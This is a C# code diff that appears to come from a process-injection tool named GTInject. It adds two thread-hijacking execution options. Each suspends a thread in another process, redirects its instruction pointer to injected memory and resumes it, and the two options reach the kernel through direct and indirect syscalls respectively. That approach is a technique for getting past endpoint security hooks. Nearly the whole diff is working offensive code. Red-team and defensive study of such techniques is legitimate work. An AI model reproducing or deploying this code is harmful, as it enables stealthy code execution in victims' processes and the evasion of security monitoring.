@@ -42,6 +42,10 @@ namespace GTInject.Injection
                     return execopt302(memaddr, pid, tid);
                 case 303:
                     return execopt303(memaddr, pid, tid);
+                case 304:
+                    return execopt304(memaddr, pid, tid);
+                case 305:
+                    return execopt305(memaddr, pid, tid);
                 default:
                     Console.WriteLine( "[-] Not a valid Thread Execution option integer");
                     return IntPtr.Zero;
@@ -479,6 +483,106 @@ namespace GTInject.Injection
                 }
                 return targetThread; // returning an IntPtr, threadhandle is already an IntPtr
             }
+
+        }
+
+
+        private static IntPtr execopt304(IntPtr memaddr, Process ProcID, int ThreadID)
+        {
+            /////////////////////////////////////
+            // OPTION 304 == Direct Syscall - GetThreadContext - SetThreadContext "Thread Hijacking"
+            /////////////////////////////////////
+            // Enum the LAST thread ID in a remote process and use that to hijack? Assuming earlier thread creation has a potential to be a 'main thread' and don't want to crash teh process
+            // At WINAPI level, we can do this natively in C#, consider alternative methods for NT and syscall levels
+
+            if (ThreadID == 0)
+            {
+                // Find the 2nd last thread ID, the user hasn't selected their own
+                var threadObjects = ProcID.Threads;
+                ThreadID = threadObjects[threadObjects.Count - 2].Id;
+                Console.WriteLine("[+] Found a Thread to hijack " + ThreadID);
+            }
+            else
+            {
+                // Use the users thread Id for injection
+                Console.WriteLine("[+] Using your thread ID to hijack TID " + ThreadID);
+            }
+
+            CONTEXT64 contextObj = new CONTEXT64();
+            contextObj.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL;
+
+            var targetThread = IntPtr.Zero;
+            var cid = new CLIENT_ID { UniqueThread = (IntPtr)ThreadID };
+            OBJECT_ATTRIBUTES objAttributes = new OBJECT_ATTRIBUTES();
+            var NtOpenTResp = Syscalls.SysclNtOpenThread(out targetThread, (uint)ThreadAccessRights.AllAccess, ref objAttributes, ref cid);
+
+            Console.WriteLine("     Opened handle as thread handle = " + targetThread + ". Suspending now.. ");
+            ulong prevSusCount = 999;
+            var resp = Syscalls.SysclNtSuspendThread(targetThread, out prevSusCount);
+            Console.WriteLine("     Direct Syscall NtSuspend response {0} with previous suspend count {1}", resp, prevSusCount);
+
+
+            resp = Syscalls.SysclNtGetContextThread(targetThread, ref contextObj);
+            contextObj.Rip = (ulong)memaddr;
+            Console.WriteLine("     Direct Syscall NtGetContextThread response {0} and RIP set to {1}", resp, contextObj.Rip);
+
+            resp = Syscalls.SysclNtSetContextThread(targetThread, ref contextObj);
+            Console.WriteLine("     Direct Syscall NtSetContextThread response {0}", resp);
+
+            var ntResTResp = Syscalls.SysclNtResumeThread(targetThread, 0);
+            Console.WriteLine("     Direct Syscall NtResumethread response " + ntResTResp);
+            return IntPtr.Zero;
+
+
+        }
+
+
+
+        private static IntPtr execopt305(IntPtr memaddr, Process ProcID, int ThreadID)
+        {
+            /////////////////////////////////////
+            // OPTION 305 == Indirect Syscall - GetThreadContext - SetThreadContext "Thread Hijacking"
+            /////////////////////////////////////
+            // Enum the LAST thread ID in a remote process and use that to hijack? Assuming earlier thread creation has a potential to be a 'main thread' and don't want to crash teh process
+            // At WINAPI level, we can do this natively in C#, consider alternative methods for NT and syscall levels
+
+            if (ThreadID == 0)
+            {
+                // Find the 2nd last thread ID, the user hasn't selected their own
+                var threadObjects = ProcID.Threads;
+                ThreadID = threadObjects[threadObjects.Count - 2].Id;
+                Console.WriteLine("[+] Found a Thread to hijack " + ThreadID);
+            }
+            else
+            {
+                // Use the users thread Id for injection
+                Console.WriteLine("[+] Using your thread ID to hijack TID " + ThreadID);
+            }
+
+            CONTEXT64 contextObj = new CONTEXT64();
+            contextObj.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL;
+
+            var targetThread = IntPtr.Zero;
+            var cid = new CLIENT_ID { UniqueThread = (IntPtr)ThreadID };
+            OBJECT_ATTRIBUTES objAttributes = new OBJECT_ATTRIBUTES();
+            var NtOpenTResp = Syscalls.IndirectSysclNtOpenThread(out targetThread, (uint)ThreadAccessRights.AllAccess, ref objAttributes, ref cid);
+
+            Console.WriteLine("     Opened handle as thread handle = " + targetThread + ". Suspending now.. ");
+            ulong prevSusCount = 999;
+            var resp = Syscalls.IndirectSysclNtSuspendThread(targetThread, out prevSusCount);
+            Console.WriteLine("     Indirect Syscall NtSuspend response {0} with previous suspend count {1}", resp, prevSusCount);
+
+
+            resp = Syscalls.IndirectSysclNtGetContextThread(targetThread, ref contextObj);
+            contextObj.Rip = (ulong)memaddr;
+            Console.WriteLine("     Indirect Syscall NtGetContextThread response {0} and RIP set to {1}", resp, contextObj.Rip);
+
+            resp = Syscalls.IndirectSysclNtSetContextThread(targetThread, ref contextObj);
+            Console.WriteLine("     Indirect Syscall NtSetContextThread response {0}", resp);
+
+            var ntResTResp = Syscalls.IndirectSysclNtResumeThread(targetThread, 0);
+            Console.WriteLine("     Indirect Syscall NtResumethread response " + ntResTResp);
+            return IntPtr.Zero;
 
         }
 
